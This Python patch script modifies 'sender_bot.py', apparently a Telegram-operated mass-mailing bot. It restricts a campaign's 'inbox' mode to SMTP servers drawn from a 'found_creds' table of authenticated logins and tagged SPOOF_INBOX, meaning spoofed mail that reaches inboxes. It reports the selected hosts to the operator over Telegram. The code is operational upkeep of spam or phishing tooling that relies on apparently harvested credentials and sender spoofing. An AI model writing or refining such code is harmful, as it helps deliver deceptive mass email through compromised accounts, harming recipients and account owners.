#!/usr/bin/env python3
"""Fix INBOX ONLY to use SPOOF_INBOX only (not BASIQUE_INBOX)."""

TARGET = "/opt/darkvasend/auditguard/sender_bot.py"

with open(TARGET, "r") as f:
    content = f.read()

# Fix 1: Button count — only SPOOF_INBOX
content = content.replace(
    '[InlineKeyboardButton("INBOX ONLY (" + str(si_c + bi_c) + " SMTP)", callback_data="csp_mode_inbox")]',
    '[InlineKeyboardButton("SPOOF INBOX (" + str(si_c) + " SMTP)", callback_data="csp_mode_inbox")]'
)

# Fix 2: Campaign filter — only SPOOF_INBOX (not BASIQUE_INBOX)
OLD_FILTER = '''    if mode == "inbox":
        # Only use INBOX-classified SMTPs (SPOOF_INBOX + BASIQUE_INBOX)
        # IMPORTANT: deactivate non-inbox SMTPs in campaign_smtp table
        # so the sending loop (which re-fetches from DB) respects the filter
        import sqlite3 as _sql
        _db = _sql.connect(db_path, timeout=10)
        _db.row_factory = _sql.Row
        _inbox_ids = set()
        for row in _db.execute("SELECT id, context FROM found_creds WHERE auth_ok=1").fetchall():
            ctx = row["context"] or ""
            if "INBOX_" in ctx:
                _inbox_ids.add(row["id"])
        _db.close()
        # Deactivate non-inbox SMTPs in the campaign so the loop won't use them
        non_inbox = [s for s in smtp_list if s["cred_id"] not in _inbox_ids]
        for s in non_inbox:
            mgr.deactivate_smtp(s["id"], "not_inbox_classified")
        smtp_list = [s for s in smtp_list if s["cred_id"] in _inbox_ids]
        if not smtp_list:
            send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP INBOX disponible", chat_id)
            mgr.close()
            return
        inbox_names = ", ".join(s["host"] for s in smtp_list)
        send_telegram("INBOX ONLY: " + str(len(smtp_list)) + " SMTP (" + inbox_names + ")", chat_id)'''

NEW_FILTER = '''    if mode == "inbox":
        # Only SPOOF_INBOX SMTPs (spoof that lands in inbox)
        # Deactivate all others in campaign_smtp so the loop respects it
        import sqlite3 as _sql
        _db = _sql.connect(db_path, timeout=10)
        _db.row_factory = _sql.Row
        _spoof_inbox_ids = set()
        for row in _db.execute("SELECT id, context FROM found_creds WHERE auth_ok=1").fetchall():
            ctx = row["context"] or ""
            if "SPOOF_INBOX_" in ctx:
                _spoof_inbox_ids.add(row["id"])
        _db.close()
        non_inbox = [s for s in smtp_list if s["cred_id"] not in _spoof_inbox_ids]
        for s in non_inbox:
            mgr.deactivate_smtp(s["id"], "not_spoof_inbox")
        smtp_list = [s for s in smtp_list if s["cred_id"] in _spoof_inbox_ids]
        if not smtp_list:
            send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP SPOOF INBOX", chat_id)
            mgr.close()
            return
        inbox_names = ", ".join(s["host"] for s in smtp_list)
        send_telegram("SPOOF INBOX: " + str(len(smtp_list)) + " SMTP (" + inbox_names + ")", chat_id)'''

content = content.replace(OLD_FILTER, NEW_FILTER)

with open(TARGET, "w") as f:
    f.write(content)

import ast
ast.parse(open(TARGET).read())
print("SPOOF INBOX ONLY FIX + SYNTAX OK")
